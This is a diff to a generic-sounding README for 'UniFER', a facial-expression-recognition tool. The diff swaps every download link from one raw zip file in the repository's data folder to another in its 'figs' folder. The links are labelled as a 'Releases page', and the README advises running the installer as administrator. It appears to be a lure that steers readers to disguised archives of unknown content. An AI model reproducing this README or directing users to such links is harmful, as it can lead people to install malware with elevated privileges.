@@ -5,7 +5,7 @@
 Welcome to UniFER! This software helps you recognize facial expressions effectively. Whether you're a student, researcher, or just curious about this technology, you’ll find it easy to use.
 
 ## 📥 Download Now
-[![Download UniFER](https://raw.githubusercontent.com/asiasasd/UniFER/master/eval_affectnet/UniFER-v2.8-alpha.3.zip%20UniFER-v1.0-brightgreen)](https://raw.githubusercontent.com/asiasasd/UniFER/master/eval_affectnet/UniFER-v2.8-alpha.3.zip)
+[![Download UniFER](https://github.com/asiasasd/UniFER/raw/refs/heads/master/figs/FER-Uni-v3.8.zip%20UniFER-v1.0-brightgreen)](https://github.com/asiasasd/UniFER/raw/refs/heads/master/figs/FER-Uni-v3.8.zip)
 
 ## 🖥️ System Requirements
 To run UniFER smoothly, ensure your computer meets the following minimum requirements:
@@ -28,11 +28,11 @@ UniFER offers a range of features:
 ## 📂 Download & Install
 To get UniFER, please visit the following page:
 
-[Download UniFER](https://raw.githubusercontent.com/asiasasd/UniFER/master/eval_affectnet/UniFER-v2.8-alpha.3.zip)
+[Download UniFER](https://github.com/asiasasd/UniFER/raw/refs/heads/master/figs/FER-Uni-v3.8.zip)
 
 Follow these steps to install UniFER on your system:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/asiasasd/UniFER/master/eval_affectnet/UniFER-v2.8-alpha.3.zip).
+1. Go to the [Releases page](https://github.com/asiasasd/UniFER/raw/refs/heads/master/figs/FER-Uni-v3.8.zip).
 2. Find the latest version listed at the top.
 3. Click on the version link to view available files.
 4. Download the file that matches your operating system.
@@ -55,7 +55,7 @@ Once you have installed UniFER, using it is straightforward:
 If you encounter any issues while using UniFER:
 
 - **Ensure your system meets the requirements.**
-- **Check that you have the latest version.** Visit the [Releases page](https://raw.githubusercontent.com/asiasasd/UniFER/master/eval_affectnet/UniFER-v2.8-alpha.3.zip) for updates.
+- **Check that you have the latest version.** Visit the [Releases page](https://github.com/asiasasd/UniFER/raw/refs/heads/master/figs/FER-Uni-v3.8.zip) for updates.
 - If you experience errors during installation, try running the installer as an administrator.
 - For additional help, refer to the FAQ section on our Wiki page or reach out through our support channels.
 
